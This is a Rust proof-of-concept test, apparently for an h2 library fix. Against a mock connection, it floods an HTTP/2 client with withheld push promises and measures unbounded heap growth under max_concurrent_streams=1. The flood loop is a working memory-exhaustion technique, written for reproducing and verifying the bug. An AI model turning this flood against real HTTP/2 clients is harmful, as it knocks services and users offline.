// h2-4 / PR #968 (fix a26b427).
// A server can reserve push-promise streams and then withhold the response
// HEADERS, leaving the streams in the ReservedRemote state. At the baseline
// recv_push_promise only calls ensure_can_reserve (which checks whether push is
// enabled, not any cap), so reserved streams are never counted against
// max_concurrent_streams. A client therefore holds unbounded stream state: no
// REFUSED_STREAM is ever sent, and heap grows linearly with the number of
// withheld promises even though max_concurrent_streams is 1.
//
// Exit 0 iff the flood is accepted without any REFUSED_STREAM and the retained
// heap grows roughly linearly with the promise count.
use h2_support::prelude::*;
use h2_support::prelude::futures::StreamExt;
use std::alloc::{GlobalAlloc, Layout, System};
use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};

struct Counting;
static LIVE: AtomicUsize = AtomicUsize::new(0);
unsafe impl GlobalAlloc for Counting {
    unsafe fn alloc(&self, l: Layout) -> *mut u8 {
        let p = System.alloc(l);
        if !p.is_null() {
            LIVE.fetch_add(l.size(), SeqCst);
        }
        p
    }
    unsafe fn dealloc(&self, p: *mut u8, l: Layout) {
        LIVE.fetch_sub(l.size(), SeqCst);
        System.dealloc(p, l)
    }
}
#[global_allocator]
static A: Counting = Counting;

// Returns (retained heap bytes across the flood, number of REFUSED_STREAM resets seen).
async fn measure(n: usize) -> (isize, usize) {
    let (io, mut srv) = mock::new();

    let srv = async move {
        let settings = srv
            .assert_client_handshake_with_settings(frames::settings().max_concurrent_streams(1))
            .await;
        let _ = settings;
        srv.recv_frame(
            frames::headers(1)
                .request("GET", "https://example.com/")
                .eos(),
        )
        .await;
        srv.send_frame(frames::headers(1).response(200)).await;
        // Reserve n push streams (even ids) and withhold their response HEADERS.
        let mut refused = 0usize;
        for i in 0..n {
            let promised = 2 + (i as u32) * 2;
            srv.send_frame(
                frames::push_promise(1, promised)
                    .request("GET", "https://example.com/pushed"),
            )
            .await;
            // A fixed server would start refusing; drain any reset without blocking.
            if let Ok(Some(Ok(frame))) =
                tokio::time::timeout(std::time::Duration::from_millis(0), srv.next()).await
            {
                if format!("{:?}", frame).contains("REFUSED_STREAM") {
                    refused += 1;
                }
            }
        }
        srv.ping_pong([9; 8]).await;
        refused
    };

    let app = async move {
        let (mut client, mut conn) = client::Builder::new()
            .max_concurrent_streams(1)
            .handshake::<_, Bytes>(io)
            .await
            .unwrap();
        let req = Request::get("https://example.com/").body(()).unwrap();
        let (mut response, _) = client.send_request(req, true).unwrap();
        // Hold the push-promise stream (and thus the reserved stream state)
        // across the flood without consuming it.
        let mut pushes = response.push_promises();
        let before = LIVE.load(SeqCst) as isize;
        let refused = conn.drive(srv).await;
        let after = LIVE.load(SeqCst) as isize;
        // Keep the handles alive until after measuring.
        let _ = &mut pushes;
        let _ = &mut response;
        (after - before, refused)
    };

    app.await
}

#[tokio::main(flavor = "current_thread")]
async fn main() {
    let small = 500usize;
    let big = 5_000usize;
    let (h_small, r1) = measure(small).await;
    let (h_big, r2) = measure(big).await;
    println!(
        "withheld push promises: {} reserved held ~{} B ({} refused); {} reserved held ~{} B ({} refused)",
        small, h_small, r1, big, h_big, r2
    );
    println!(
        "10x promises -> {:.2}x heap",
        h_big as f64 / h_small.max(1) as f64
    );
    let unbounded =
        r1 == 0 && r2 == 0 && h_small > 10_000 && (h_big as f64) > (h_small as f64) * 6.0;
    if unbounded {
        println!("DEMONSTRATED: reserved push streams are uncapped under max_concurrent_streams=1");
        std::process::exit(0);
    } else {
        println!("NOT demonstrated (promises refused or growth bounded)");
        std::process::exit(1);
    }
}
